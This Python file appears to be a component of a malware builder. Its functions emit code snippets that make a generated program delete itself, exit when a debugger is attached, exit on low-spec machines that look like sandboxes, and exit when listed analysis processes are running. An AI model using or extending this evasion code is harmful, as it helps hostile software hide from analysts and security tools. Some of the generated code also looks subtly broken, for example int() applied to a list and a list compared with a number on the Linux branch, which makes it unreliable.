def python_seppuku():
    d = '''
def s():
    os.remove(__file__)
    '''
    return d


def python_anti_debug_checks():
    return '''
def c_debug():
    if sys.gettrace() is not None or os.environ.get('USING_PDB') or os.environ.get('PYDEV_CONSOLE_ENCODING') or os.environ.get('PYDEVD_LOAD_VALUES_ASYNC'):
        sys.exit()
c_debug()
    '''


def python_specs_checks(os_name: str):
    d = '''
def c_exec(i):
    return subprocess.check_output(i, stdin=subprocess.PIPE, shell=True).decode('utf-8').split('\\n')
    
def c_specs():
    rx = r"\d+[.,]?\d*"'''
    if 'win' in os_name.lower():
        d += '''
    t_mem = int(float(re.findall(rx, c_exec('systeminfo | findstr /C:"Total Physical Memory"')[0])[0]) * 1024)
    t_dsk = int(re.findall(rx, c_exec('wmic logicaldisk get size')[1])[0]) // 1024 // 1024'''
    else:
        d += '''
    t_mem = int(re.findall(rx, c_exec('grep MemTotal /proc/meminfo')[0])) / 1024
    t_dsk = re.findall(rx, c_exec('df -h / | awk \'{print $2}\' | tail -n 1')[0])'''
    d += '''
    t_cpu = os.cpu_count()
    if t_mem < 4000 or t_dsk < 50000 or t_cpu <= 2:
        sys.exit()
c_specs()
    '''
    return d


def python_proc_checks(os_name: str, proc_list: []):
    d = f'''
def c_proc():
    ss = {str(proc_list)}
    '''
    if 'win' in os_name.lower():
        d += '''
    ps = subprocess.check_output('tasklist', stdin=subprocess.PIPE, shell=True).decode('utf-8').split('\\n')'''
    else:
        d += '''
    ps = subprocess.check_output(['ps', 'aux'], stdin=subprocess.PIPE, shell=True).decode('utf-8').split('\\n')'''
    d += '''
    for pr in ps:
        for sr in ss:
            if re.search(sr, pr, re.IGNORECASE):
                sys.exit()
c_proc()
    '''
    return d
